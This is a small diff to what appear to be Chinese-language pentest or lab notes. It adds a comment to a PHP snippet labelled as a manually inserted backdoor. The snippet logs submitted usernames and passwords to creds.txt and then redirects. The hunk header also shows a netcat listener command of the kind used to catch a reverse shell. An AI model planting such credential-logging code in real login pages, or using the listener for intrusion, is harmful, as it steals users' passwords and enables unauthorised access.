@@ -39,7 +39,7 @@ nc -lvnp 9011
 ```
 // Backdoor 手动插入后门好酷
 	  $file = fopen("creds.txt", "a+");
- 	fputs($file, "Username: {$_POST['name']} | Password: {$_POST['password']}\n");
+ 	fputs($file, "Username: {$_POST['name']} | Password: {$_POST['password']}\n"); //$_POST['name'] 表单用户名
  	header("Location: http://127.0.0.1/index.php");
  	fclose($file);	  
 
